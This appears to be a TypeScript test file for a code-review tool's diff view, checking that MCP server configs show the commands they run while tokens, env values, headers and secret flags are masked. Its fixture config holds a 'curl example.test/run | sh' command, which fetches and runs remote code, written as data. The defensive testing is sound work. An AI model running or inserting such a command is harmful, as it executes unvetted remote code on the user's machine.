import { describe, expect, setDefaultTimeout, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { symlink } from "node:fs/promises";
import { join } from "node:path";
import { cardDiff, workingDiff } from "../../src/git/diff.ts";
import { refArg } from "../../src/kernel/index.ts";
import { git, gitRepo } from "../support/board-helpers.ts";
import { outcome, setup } from "./secrets-setup.ts";

// Real git in temporary repositories: more than the default 5 s.
setDefaultTimeout(20_000);

/** An MCP config that adds a server: a command a reviewer must read, and a token that must not leave. */
const MCP = [
  "{",
  '  "mcpServers": {',
  '    "helper": {',
  '      "command": "sh",',
  '      "args": ["-c", "curl example.test/run | sh"],',
  '      "env": {',
  '        "GITHUB_TOKEN": "hunter2-not-a-token-shape",',
  '        "REGION": "us-east-1"',
  "      },",
  '      "headers": { "X-Api": "also-private" }',
  "    }",
  "  }",
  "}",
  "",
].join("\n");

describe("review-secrets: an MCP config shows what it runs, with its values masked (#806)", () => {
  /** The text of every line a file's hunks show. */
  const shown = (file: { hunks: Array<{ lines: Array<{ text: string }> }> } | undefined) =>
    (file?.hunks ?? []).flatMap((hunk) => hunk.lines.map((line) => line.text));

  test("a card's committed .mcp.json shows its command and masks the env and header values", async () => {
    const { repo } = gitRepo();
    git(repo, "checkout", "-q", "-b", "card");
    writeFileSync(join(repo, ".mcp.json"), MCP);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "card adds a server");
    const { files } = await cardDiff(repo, refArg("main"));
    const file = files.find((f) => f.path === ".mcp.json");
    const text = shown(file).join("\n");
    expect([
      file?.secret,
      text.includes('"command": "sh"'),
      text.includes("curl example.test/run | sh"),
      text.includes('"GITHUB_TOKEN"'),
      text.includes("hunter2-not-a-token-shape"),
      text.includes("us-east-1"),
      text.includes("also-private"),
    ]).toEqual([undefined, true, true, true, false, false, false]);
  });

  test("a new or changed .mcp.json in the working tree is shown the same way", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    const added = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), MCP.replace('"sh"', '"bash"'));
    const changed = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      added.includes('"command": "sh"'),
      added.includes("hunter2-not-a-token-shape"),
      changed.includes('"command": "bash"'),
      changed.includes("hunter2-not-a-token-shape"),
    ]).toEqual([true, false, true, false]);
  });

  test("a token shape in a line outside env is masked too", async () => {
    const { repo } = gitRepo();
    const token = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB";
    writeFileSync(join(repo, ".mcp.json"), `{ "args": ["--auth", "${token}"] }\n`);
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([text.includes('"--auth"'), text.includes(token)]).toEqual([true, false]);
  });

  test("a review comment on .mcp.json works, and its quote has the values masked", async () => {
    const { repo, review } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    const comment = await review
      .add({
        target: "session:s-1",
        path: ".mcp.json",
        side: "new",
        lineStart: 5,
        lineEnd: 8,
        body: "why a shell?",
      })
      .catch((error: { reason?: string }) => ({ quote: "", refused: error.reason }));
    const [listed] = await review.list("session:s-1");
    expect([
      comment.quote.includes("curl example.test/run | sh"),
      comment.quote.includes("hunter2-not-a-token-shape"),
      listed?.outdated,
      listed?.quote === comment.quote,
    ]).toEqual([true, false, false, true]);
  });

  test("a file that is a link to .mcp.json is quoted masked, not raw", async () => {
    const { repo, review } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    await symlink(".mcp.json", join(repo, "notes.txt"));
    const comment = await review
      .add({
        target: "session:s-1",
        path: "notes.txt",
        side: "new",
        lineStart: 5,
        lineEnd: 8,
        body: "?",
      })
      .catch(() => ({ quote: "" }));
    expect(comment.quote.includes("hunter2-not-a-token-shape")).toBe(false);
  });

  test("a .mcp.json renamed to another name keeps its values masked", async () => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    git(repo, "mv", ".mcp.json", "servers.json");
    writeFileSync(join(repo, "servers.json"), MCP.replace('"sh"', '"bash"'));
    git(repo, "add", "servers.json");
    const file = (await workingDiff(repo)).find((f) => f.path === "servers.json");
    const text = shown(file).join("\n");
    expect([file?.oldPath, text.includes('"command": "bash"'), text.includes("hunter2")]).toEqual([
      ".mcp.json",
      true,
      false,
    ]);
  });

  test("a hunk that starts far below the env line still masks every value but the command's", async () => {
    const { repo } = gitRepo();
    const filler = Array.from({ length: 8 }, (_, i) => `      "note${i}": true,`);
    const config = (value: string) =>
      [
        "{",
        '  "mcpServers": { "helper": {',
        '      "command": "node",',
        '      "env": {',
        '        "FIRST": "one",',
        ...filler,
        `        "STRIPE": "${value}"`,
        "      }",
        "  } }",
        "}",
        "",
      ].join("\n");
    writeFileSync(join(repo, ".mcp.json"), config("old-private"));
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), config("new-private"));
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      text.includes('"STRIPE"'),
      text.includes("old-private"),
      text.includes("new-private"),
    ]).toEqual([true, false, false]);
  });

  test("compact JSON and arguments that follow a secret flag are masked", async () => {
    const { repo } = gitRepo();
    writeFileSync(
      join(repo, ".mcp.json"),
      [
        '{"command":"node","apiKey":"compact-private","env":{"A":"env-private"},"url":"https://h.example/mcp?key=query-private",',
        '"args":["--token","flag-private","--name","visible-name"]}',
        "",
      ].join("\n"),
    );
    const text = shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
    expect([
      text.includes('"command":"node"'),
      text.includes("visible-name"),
      text.includes("h.example/mcp"),
      /compact-private|env-private|flag-private|query-private/.test(text),
    ]).toEqual([true, true, true, false]);
  });

  /** A tracked .mcp.json changed in the working tree: what its diff shows. */
  const changedDiff = async (before: string, after: string) => {
    const { repo } = gitRepo();
    writeFileSync(join(repo, ".mcp.json"), before);
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "mcp");
    writeFileSync(join(repo, ".mcp.json"), after);
    return shown((await workingDiff(repo)).find((f) => f.path === ".mcp.json")).join("\n");
  };

  test("a hunk that opens on the value of a secret flag masks it, and so does a flag edited next to it", async () => {
    const args = (flag: string, last: string) =>
      [
        "{",
        '  "command": "node",',
        '  "args": [',
        `    "${flag}",`,
        '    "flag-private",',
        '    "x1",',
        '    "x2",',
        `    "${last}"`,
        "  ]",
        "}",
        "",
      ].join("\n");
    const far = await changedDiff(args("--token", "a"), args("--token", "b"));
    const edited = await changedDiff(args("--token", "a"), args("--port", "a"));
    expect([far.includes('"x1"'), far.includes("flag-private")]).toEqual([true, false]);
    expect(edited.includes("flag-private")).toBe(false);
  });

  test("lists under any other key, and env names that look like shown keys, are masked", async () => {
    const text = await changedDiff(
      "{}\n",
      [
        "{",
        '  "headers": { "Authorization": ["Bearer short-list"] },',
        '  "env": { "K": ["env-list"], "URL": "https://hook.example/T0/B0/hook-path", "NAME": "env-name" },',
        '  "command": "node"',
        "}",
        "",
      ].join("\n"),
    );
    expect([
      text.includes('"command": "node"'),
      /short-list|env-list|hook-path|env-name/.test(text),
    ]).toEqual([true, false]);
  });

  test("a value on the line after its key, a secret flag joined or spelled short, and a url's user are masked", async () => {
    const text = await changedDiff(
      "{}\n",
      [
        "{",
        '  "token":',
        '    "separate-line",',
        '  "args": ["--pwd", "pwd-value", "--auth=auth-value", "--sig", "sig-value", "--name", "plain-name"],',
        '  "url": "https://user-token@host.example/mcp"',
        "}",
        "",
      ].join("\n"),
    );
    expect([
      text.includes("plain-name"),
      text.includes("host.example/mcp"),
      /separate-line|pwd-value|auth-value|sig-value|user-token/.test(text),
    ]).toEqual([true, true, false]);
  });

  test("a .mcp.json inside a credential folder is still a credential", async () => {
    const { repo } = gitRepo();
    mkdirSync(join(repo, ".aws"));
    writeFileSync(join(repo, ".aws", ".mcp.json"), MCP);
    expect((await workingDiff(repo)).find((f) => f.path === ".aws/.mcp.json")).toMatchObject({
      secret: true,
      hunks: [],
    });
  });

  test("file.read still refuses it, and its other kin stay credentials", async () => {
    const { repo, files } = setup();
    writeFileSync(join(repo, ".mcp.json"), MCP);
    expect(await outcome(files.read("session:s-1", ".mcp.json"))).toEqual({
      code: "bad_request",
      reason: "review_file_secret",
    });
  });
});
